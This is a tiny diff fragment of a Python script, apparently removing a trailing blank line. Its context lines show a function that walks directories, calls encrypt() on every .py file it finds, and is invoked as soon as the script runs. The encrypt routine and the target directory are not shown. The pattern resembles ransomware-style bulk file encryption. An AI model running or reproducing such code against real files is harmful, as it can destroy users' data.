@@ -31,4 +31,3 @@ def sh():
 			if(i[-3:]==".py"):
 				encrypt(os.path.abspath(os.path.join(root,i)))
 sh()
-
